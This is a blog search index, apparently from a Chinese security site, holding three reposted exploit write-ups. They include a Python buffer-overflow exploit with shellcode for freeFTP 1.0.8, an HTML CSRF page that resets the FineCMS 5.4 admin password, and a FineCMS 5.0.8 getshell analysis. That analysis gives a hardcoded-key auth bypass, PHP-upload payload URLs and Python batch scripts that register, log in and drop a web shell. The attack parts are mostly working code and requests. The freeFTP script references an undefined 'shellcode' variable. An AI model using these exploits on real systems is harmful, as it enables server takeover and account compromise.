<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2021/01/20/freeFTP1.0.8-&#39;PASS&#39;%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>2021/01/20/freeFTP1.0.8-&#39;PASS&#39;%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#67;&#97;&#116;&#87;&#x46;&#89;&#x40;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#109;">&#74;&#x6f;&#67;&#97;&#116;&#87;&#x46;&#89;&#x40;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#109;</a></p><h2 id="freeFTP1-0-8-‘PASS’远程缓冲区溢出"><a href="#freeFTP1-0-8-‘PASS’远程缓冲区溢出" class="headerlink" title="freeFTP1.0.8-‘PASS’远程缓冲区溢出"></a>freeFTP1.0.8-‘PASS’远程缓冲区溢出</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: freeFTP 1.0.8 - Remote Buffer Overflow</span></span><br><span class="line"><span class="comment"># Date: 2019-09-01</span></span><br><span class="line"><span class="comment"># Author: Chet Manly</span></span><br><span class="line"><span class="comment"># Software Link: https://download.cnet.com/FreeFTP/3000-2160_4-10047242.html</span></span><br><span class="line"><span class="comment"># Version: 1.0.8</span></span><br><span class="line"><span class="comment"># CVE: N/A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x89\xe1\xdb\xdf\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x48\x68\x6d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x52\x57\x70\x75\x50\x63\x30\x51\x70\x6c\x49\x38\x65&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x64\x71\x79\x50\x31\x74\x6e\x6b\x52\x70\x44\x70\x4e&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6b\x66\x32\x44\x4c\x6c\x4b\x30\x52\x57\x64\x4c\x4b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x43\x42\x64\x68\x36\x6f\x58\x37\x32\x6a\x55\x76\x36&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x51\x79\x6f\x6c\x6c\x77\x4c\x61\x71\x43\x4c\x63\x32&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x56\x4c\x47\x50\x6b\x71\x5a\x6f\x34\x4d\x45\x51\x6f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x37\x68\x62\x6a\x52\x76\x32\x70\x57\x4c\x4b\x73\x62&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x44\x50\x4c\x4b\x72\x6a\x77\x4c\x6c\x4b\x72\x6c\x57&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x61\x52\x58\x49\x73\x47\x38\x33\x31\x68\x51\x66\x31&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6c\x4b\x31\x49\x55\x70\x47\x71\x69\x43\x6c\x4b\x72&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x69\x32\x38\x39\x73\x64\x7a\x63\x79\x4c\x4b\x37\x44&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6c\x4b\x66\x61\x4a\x76\x35\x61\x39\x6f\x6c\x6c\x6f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x31\x68\x4f\x54\x4d\x33\x31\x78\x47\x35\x68\x49\x70&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x30\x75\x49\x66\x45\x53\x51\x6d\x49\x68\x37\x4b\x73&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4d\x61\x34\x71\x65\x6d\x34\x36\x38\x4c\x4b\x32\x78&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x65\x74\x66\x61\x6a\x73\x65\x36\x4c\x4b\x74\x4c\x30&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4b\x4c\x4b\x51\x48\x57\x6c\x75\x51\x6a\x73\x6c\x4b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x53\x34\x6e\x6b\x43\x31\x4a\x70\x4d\x59\x53\x74\x66&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x44\x55\x74\x53\x6b\x31\x4b\x63\x51\x36\x39\x62\x7a&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x62\x71\x69\x6f\x6d\x30\x71\x4f\x51\x4f\x71\x4a\x4e&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6b\x62\x32\x6a\x4b\x6e\x6d\x53\x6d\x70\x6a\x47\x71&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4c\x4d\x4e\x65\x4c\x72\x53\x30\x65\x50\x47\x70\x66&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x30\x30\x68\x65\x61\x4c\x4b\x32\x4f\x4c\x47\x6b\x4f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x69\x45\x4d\x6b\x6c\x30\x48\x35\x4e\x42\x71\x46\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x48\x59\x36\x4a\x35\x4d\x6d\x6d\x4d\x79\x6f\x38\x55&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x47\x4c\x33\x36\x53\x4c\x56\x6a\x6f\x70\x49\x6b\x6b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x50\x73\x45\x37\x75\x6d\x6b\x31\x57\x46\x73\x63\x42&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x72\x4f\x43\x5a\x45\x50\x56\x33\x4b\x4f\x48\x55\x55&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x33\x35\x31\x32\x4c\x53\x53\x66\x4e\x55\x35\x72\x58&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x45\x35\x53\x30\x41\x41&quot;</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">&#x27;A&#x27;</span> * <span class="number">276</span></span><br><span class="line">buf += <span class="string">&#x27;\x90&#x27;</span> * <span class="number">10</span></span><br><span class="line">buf += shellcode</span><br><span class="line">buf += <span class="string">&#x27;B&#x27;</span> * (<span class="number">486</span> - <span class="built_in">len</span>(shellcode))</span><br><span class="line">buf += <span class="string">&#x27;\x58&#x27;</span> <span class="comment"># pop eax</span></span><br><span class="line">buf += <span class="string">&#x27;\xfe\xcc&#x27;</span> <span class="comment"># dec ah</span></span><br><span class="line">buf += <span class="string">&#x27;\xfe\xcc&#x27;</span> <span class="comment"># dec ah</span></span><br><span class="line">buf += <span class="string">&#x27;\xff\xe0&#x27;</span> <span class="comment"># jmp eax</span></span><br><span class="line">buf += <span class="string">&#x27;C&#x27;</span> * <span class="number">4</span></span><br><span class="line">buf += <span class="string">&#x27;\xe8\xf0\xff\xff\xff&#x27;</span> <span class="comment"># call near</span></span><br><span class="line">buf += <span class="string">&#x27;D&#x27;</span> * <span class="number">9</span></span><br><span class="line">buf += <span class="string">&#x27;\xeb\xf0\x90\x90&#x27;</span> <span class="comment"># jump backwards</span></span><br><span class="line">buf += <span class="string">&#x27;\xc0\x3d\x42\x00&#x27;</span> <span class="comment"># 0x00423dc0 - pop, pop, ret</span></span><br><span class="line">buf += <span class="string">&#x27;E&#x27;</span> * (<span class="number">1000</span> - <span class="built_in">len</span>(buf))</span><br><span class="line">ftp = FTP()</span><br><span class="line">ftp.connect(<span class="string">&#x27;192.168.1.1&#x27;</span>, <span class="number">21</span>)</span><br><span class="line">ftp.login(<span class="string">&#x27;anonymous&#x27;</span>, buf)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Finecms_v5.4存在CSRF漏洞可修改管理员账户密码</title>
      <link href="2021/01/20/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/"/>
      <url>2021/01/20/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#x40;&#x31;&#54;&#51;&#46;&#99;&#x6f;&#x6d;">&#x4a;&#x6f;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#x40;&#x31;&#54;&#51;&#46;&#99;&#x6f;&#x6d;</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td>Finecms_v5.4存在CSRF漏洞可修改管理员账户密码</td><td>2018-10-07</td><td>踏月留香</td><td><a href="http://www.finecms.net/">http://www.finecms.net/</a></td><td><a href="http://down.chinaz.com/soft/32596.htm">http://down.chinaz.com/soft/32596.htm</a></td><td>5.4</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18191">CVE-2018-18191</a></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/admin.php?c=member&amp;m=edit&amp;uid=1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;member<span class="symbol">&amp;#91;</span>email<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin<span class="symbol">&amp;#64;</span>163<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;member<span class="symbol">&amp;#91;</span>name<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;member<span class="symbol">&amp;#91;</span>phone<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18888888888&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;member<span class="symbol">&amp;#91;</span>password<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;888888&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CSRF </tag>
            
            <tag> 修改管理员密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FineCMS_v5.0.8两处getshell</title>
      <link href="2021/01/20/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/"/>
      <url>2021/01/20/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#70;&#89;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#x6f;&#109;">&#74;&#x6f;&#67;&#97;&#x74;&#x57;&#70;&#89;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#x6f;&#109;</a></p><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>就要被**，美其名曰：比我的web安全研究和代码审计更有前途。当然是选择原谅他啦。<br>先审计finecms去去火，找到六处漏洞，先放两处容易被发现的getshell和对应的两个python脚本</p><h2 id="0x02-getshell"><a href="#0x02-getshell" class="headerlink" title="0x02 getshell"></a>0x02 getshell</h2><p><strong>第一处getshell</strong>：在C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php中的data2函数，大约在第115行，有问题的代码大约在178行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function data2() &#123;</span><br><span class="line"></span><br><span class="line">    $data &#x3D; array();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 安全码认证</span><br><span class="line">    $auth &#x3D; $this-&gt;input-&gt;get(&#39;auth&#39;, true);</span><br><span class="line">    if ($auth !&#x3D; md5(SYS_KEY)) &#123;</span><br><span class="line">        &#x2F;&#x2F; 授权认证码不正确</span><br><span class="line">        $data &#x3D; array(&#39;msg&#39; &#x3D;&gt; &#39;授权认证码不正确&#39;, &#39;code&#39; &#x3D;&gt; 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; 解析数据</span><br><span class="line">        $cache &#x3D; &#39;&#39;;</span><br><span class="line">        $param &#x3D; $this-&gt;input-&gt;get(&#39;param&#39;);</span><br><span class="line">        if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;</span><br><span class="line">            $cache &#x3D; md5(dr_array2string($param));</span><br><span class="line">            $data &#x3D; $this-&gt;get_cache_data($cache);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$data) &#123;</span><br><span class="line"></span><br><span class="line">            if ($param &#x3D;&#x3D; &#39;login&#39;) &#123;</span><br><span class="line">                &#x2F;&#x2F; 登录认证</span><br><span class="line">                $code &#x3D; $this-&gt;member_model-&gt;login(</span><br><span class="line">                    $this-&gt;input-&gt;get(&#39;username&#39;),</span><br><span class="line">                    $this-&gt;input-&gt;get(&#39;password&#39;),</span><br><span class="line">                    0, 1);</span><br><span class="line">                if (is_array($code)) &#123;</span><br><span class="line">                    $data &#x3D; array(</span><br><span class="line">                        &#39;msg&#39; &#x3D;&gt; &#39;ok&#39;,</span><br><span class="line">                        &#39;code&#39; &#x3D;&gt; 1,</span><br><span class="line">                        &#39;return&#39; &#x3D;&gt; $this-&gt;member_model-&gt;get_member($code[&#39;uid&#39;])</span><br><span class="line">                    );</span><br><span class="line">                &#125; elseif ($code &#x3D;&#x3D; -1) &#123;</span><br><span class="line">                    $data &#x3D; array(&#39;msg&#39; &#x3D;&gt; fc_lang(&#39;会员不存在&#39;), &#39;code&#39; &#x3D;&gt; 0);</span><br><span class="line">                &#125; elseif ($code &#x3D;&#x3D; -2) &#123;</span><br><span class="line">                    $data &#x3D; array(&#39;msg&#39; &#x3D;&gt; fc_lang(&#39;密码不正确&#39;), &#39;code&#39; &#x3D;&gt; 0);</span><br><span class="line">                &#125; elseif ($code &#x3D;&#x3D; -3) &#123;</span><br><span class="line">                    $data &#x3D; array(&#39;msg&#39; &#x3D;&gt; fc_lang(&#39;Ucenter注册失败&#39;), &#39;code&#39; &#x3D;&gt; 0);</span><br><span class="line">                &#125; elseif ($code &#x3D;&#x3D; -4) &#123;</span><br><span class="line">                    $data &#x3D; array(&#39;msg&#39; &#x3D;&gt; fc_lang(&#39;Ucenter：会员名称不合法&#39;), &#39;code&#39; &#x3D;&gt; 0);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif ($param &#x3D;&#x3D; &#39;update_avatar&#39;) &#123;</span><br><span class="line">                &#x2F;&#x2F; 更新头像</span><br><span class="line">                $uid &#x3D; (int)$_REQUEST[&#39;uid&#39;];</span><br><span class="line">                $file &#x3D; $_REQUEST[&#39;file&#39;];</span><br><span class="line">                &#x2F;&#x2F;</span><br><span class="line">                &#x2F;&#x2F; 创建图片存储文件夹</span><br><span class="line">                $dir &#x3D; SYS_UPLOAD_PATH.&#39;&#x2F;member&#x2F;&#39;.$uid.&#39;&#x2F;&#39;;</span><br><span class="line">                @dr_dir_delete($dir);</span><br><span class="line">                if (!is_dir($dir)) &#123;</span><br><span class="line">                    dr_mkdirs($dir);</span><br><span class="line">                &#125;</span><br><span class="line">                $file &#x3D; str_replace(&#39; &#39;, &#39;+&#39;, $file);</span><br><span class="line">                if (preg_match(&#39;&#x2F;^(data:\s*image\&#x2F;(\w+);base64,)&#x2F;&#39;, $file, $result))&#123;</span><br><span class="line">                    $new_file &#x3D; $dir.&#39;0x0.&#39;.$result[2];</span><br><span class="line">                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) &#123;</span><br><span class="line">                        $data &#x3D; array(</span><br><span class="line">                            &#39;msg&#39; &#x3D;&gt; &#39;目录权限不足或磁盘已满&#39;,</span><br><span class="line">                            &#39;code&#39; &#x3D;&gt; 0</span><br><span class="line">                        );</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>其中，首先</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file &#x3D; $_REQUEST[&#39;file&#39;];</span><br></pre></td></tr></table></figure><p>获取$file变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;^(data:\s*image\&#x2F;(\w+);base64,)&#x2F;&#39;, $file, $result))&#123;</span><br><span class="line">                        $new_file &#x3D; $dir.&#39;0x0.&#39;.$result[2];</span><br><span class="line">                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) &#123;</span><br><span class="line">                            $data &#x3D; array(</span><br><span class="line">                                &#39;msg&#39; &#x3D;&gt; &#39;目录权限不足或磁盘已满&#39;,</span><br><span class="line">                                &#39;code&#39; &#x3D;&gt; 0</span><br><span class="line">                            );</span><br></pre></td></tr></table></figure><p>然后用preg_match函数进行正则匹配，因为$file变量可控，所以$result也是可控的，从而$new_file也是可控的，可以构造为php文件，然后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file))))</span><br></pre></td></tr></table></figure><p>对$result[1]进行base64解码，然后写入$new_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$auth &#x3D; $this-&gt;input-&gt;get(&#39;auth&#39;);</span><br><span class="line">if ($auth !&#x3D; md5(SYS_KEY))</span><br></pre></td></tr></table></figure><p>SYS_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在C:phpStudyWWWconfigsystem.php中有定义。直接md5加密一次即可绕过</p><p>所以最终的payload为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:88&#x2F;index.php?c&#x3D;api&amp;m&#x3D;data2&amp;auth&#x3D;50ce0d2401ce4802751739552c8e4467&amp;param&#x3D;update_avatar&amp;file&#x3D;data:image&#x2F;php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p>无需登录，直接getshell,路径为<a href="http://localhost:88/uploadfile/member/0/0x0.php">http://localhost:88/uploadfile/member/0/0x0.php</a><br><a href="https://imgchr.com/i/sf8wdJ"><img src="https://s3.ax1x.com/2021/01/20/sf8wdJ.png" alt="sf8wdJ.png"></a></p><p><strong>第二处getshell</strong>：在文件C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php中的upload函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, $file, $result))&#123;</span><br><span class="line">                $new_file = $dir.<span class="string">&#x27;0x0.&#x27;</span>.$result[<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">if</span> (!@file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, $file)))) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(dr_json(<span class="number">0</span>, <span class="string">&#x27;目录权限不足或磁盘已满&#x27;</span>));</span><br><span class="line">                </span><br></pre></td></tr></table></figure><p>注册会员，登录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问：http:&#x2F;&#x2F;localhost:88&#x2F;index.php?s&#x3D;member&amp;c&#x3D;account&amp;m&#x3D;upload</span><br><span class="line">POST：tx&#x3D;data:image&#x2F;php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/sf8dZ4"><img src="https://s3.ax1x.com/2021/01/20/sf8dZ4.png" alt="sf8dZ4.png"></a><br><a href="https://imgchr.com/i/sf8ULF"><img src="https://s3.ax1x.com/2021/01/20/sf8ULF.png" alt="sf8ULF.png"></a></p><h2 id="0x03-Python批量poc脚本"><a href="#0x03-Python批量poc脚本" class="headerlink" title="0x03 Python批量poc脚本"></a>0x03 Python批量poc脚本</h2><p>pocsuite和poc-T是两个成熟的poc框架，不过感觉核心代码是别人的，只写一些poc插件的话，就是为别人造轮子，所以抽了一些代码写了个自己的工具，可能连轻型框架都算不上，只够自己用的。<br>第一处getshell的python代码（因为是直接getshell，无需登录，所以很简单）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">target</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+&quot;</span></span><br><span class="line">    url=target+payload</span><br><span class="line">    shell=target+<span class="string">&#x27;/uploadfile/member/0/0x0.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=requests.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">        verify=requests.get(shell,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> verify.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;code&#x27;</span> <span class="keyword">in</span> verify.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br></pre></td></tr></table></figure><p>第二处getshell的Python代码（需要自动化注册、登录、利用）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Finecms version:5.0.8</span></span><br><span class="line"><span class="comment">#Author:404notfound</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    username=random.randint(<span class="number">0</span>,<span class="number">999999</span>)</span><br><span class="line">    seed = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    email = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        email.append(random.choice(seed))</span><br><span class="line">    email = <span class="string">&#x27;&#x27;</span>.join(email)</span><br><span class="line">    <span class="comment">#print email+&quot;@&quot;+email+&quot;.com&quot;</span></span><br><span class="line">    <span class="comment">#print username</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#step 1 register</span></span><br><span class="line">    <span class="comment">#print &quot;[+] register user&quot;</span></span><br><span class="line">    register_url=url+<span class="string">&quot;/index.php?s=member&amp;c=register&amp;m=index&quot;</span></span><br><span class="line">    register_payload=&#123;<span class="string">&quot;back&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;data[username]&quot;</span>:username,<span class="string">&quot;data[password]&quot;</span>:<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;data[password2]&quot;</span>:<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;data[email]&quot;</span>:email+<span class="string">&quot;@&quot;</span>+email+<span class="string">&quot;.com&quot;</span>&#125;</span><br><span class="line">    <span class="comment">#step 2 login</span></span><br><span class="line">    <span class="comment">#print &quot;[+] user login&quot;</span></span><br><span class="line">    login_url=url+<span class="string">&quot;/index.php?s=member&amp;c=login&amp;m=index&quot;</span></span><br><span class="line">    login_payload=&#123;<span class="string">&quot;back&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;data[username]&quot;</span>:username,<span class="string">&quot;data[password]&quot;</span>:<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;data[auto]&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    <span class="comment">#step 3 attack</span></span><br><span class="line">    <span class="comment">#print &quot;[+] loading payload&quot;</span></span><br><span class="line">    vul_url=url+<span class="string">&quot;/index.php?s=member&amp;c=account&amp;m=upload&quot;</span></span><br><span class="line">    vul_payload=&#123;<span class="string">&quot;tx&quot;</span>:<span class="string">&quot;data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4=&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = requests.session()</span><br><span class="line">        resu=s.post(register_url,data=register_payload)</span><br><span class="line">        result=s.post(login_url,data=login_payload)</span><br><span class="line">        result2=s.post(vul_url,data=vul_payload).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;status&quot;</span> <span class="keyword">in</span> result2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#print e</span></span><br><span class="line">    <span class="comment">#print &quot;[+] ALL DONE&quot;</span></span><br><span class="line">    <span class="comment">#step 4 find shell path</span></span><br><span class="line">       </span><br><span class="line"><span class="comment">#print poc(&quot;http://localhost&quot;)</span></span><br></pre></td></tr></table></figure><p>主代码就不贴了，可以看我的GitHub：<a href="https://github.com/404notf0und">https://github.com/404notf0und</a></p>]]></content>
      
